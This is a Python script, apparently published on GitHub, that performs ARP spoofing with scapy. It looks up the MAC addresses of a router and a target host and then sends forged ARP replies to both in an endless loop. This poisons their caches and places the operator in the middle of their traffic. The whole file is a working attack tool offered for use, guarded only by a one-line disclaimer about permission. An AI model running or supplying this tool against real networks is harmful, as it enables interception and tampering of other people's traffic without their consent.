#!/usr/bin/python3

# Arp Spoofer coded in Python 3.10.2 made by Anz
# Github: https://github.com/Anz1x
# DISCLAIMER: I am not responsible with your illegal intentions with this so don't use this on someone explicitly without their permission.
# Read README.md to check how to use and install this

import scapy.all as scapy
import sys
import time
import logging
import colorama
import os
from colorama import Fore

os.system("cls ; clear")

colorama.init(autoreset=True)

logging.basicConfig(
    level=logging.INFO,
    format="\033[38;5;21m[\033[0m%(asctime)s.%(msecs)03d\033[38;5;21m] \033[0m%(message)s\033[0m", 
    datefmt="%H:%M:%S")

logging.info(Fore.YELLOW + "Starting the arp spoofer")

def get_mac_address(ip_address):
    broadcast_layer = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_layer = scapy.ARP(pdst=ip_address)
    get_mac_packet = broadcast_layer/arp_layer
    answer = scapy.srp(get_mac_packet, timeout=2, verbose=False)[0]
    return answer[0][1].hwsrc

def spoof(router_ip, target_ip, router_mac, target_mac):
    packet_1 = scapy.ARP(op=2, hwdst=router_mac, pdst=router_ip, psrc=target_ip)
    packet_2 = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=router_ip)

    scapy.send(packet_1)
    scapy.send(packet_2)



target_ip = str(sys.argv[2])
router_ip = str(sys.argv[1])
target_mac = str(get_mac_address(target_ip))
router_mac = str(get_mac_address(router_ip))

try:
    while True:
        spoof(router_ip, target_ip, router_mac, target_mac)
        time.sleep(2)
except KeyboardInterrupt:
    print("\n")
    logging.info(Fore.YELLOW + "Stopped the arp spoofer")
    exit(0)
